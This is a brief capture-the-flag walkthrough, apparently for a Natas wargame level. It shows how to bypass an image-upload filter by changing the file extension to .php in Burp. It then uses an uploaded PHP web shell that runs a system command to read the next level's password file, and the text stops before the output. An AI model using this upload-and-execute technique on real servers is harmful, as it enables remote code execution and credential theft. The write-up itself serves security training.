we can upload an image to the server.
filename is ignored and .jpg is hardcoded when uploaded.

The point is trying to upload a php file to get the webserver to execute it.
Make a simple php file test.php:
<?php
	echo ("Hiiiiiiiiiii")
?>

but when we try to upload this file, the server will make it: /upload/grejhb3hb.jpg

Let's use Burp to intercept and modify the extension, change the extension from jpg to
php => forward

fhr34.php has been uploaded. When we click on it, the webserver outputs Hiiiiiiiiii

now we can try to cat the flag for the next level:

<?php
	system('cat /etc/natas_webpass/natas13');
?>

reupload, intercept and change the extension, the webserver will output:
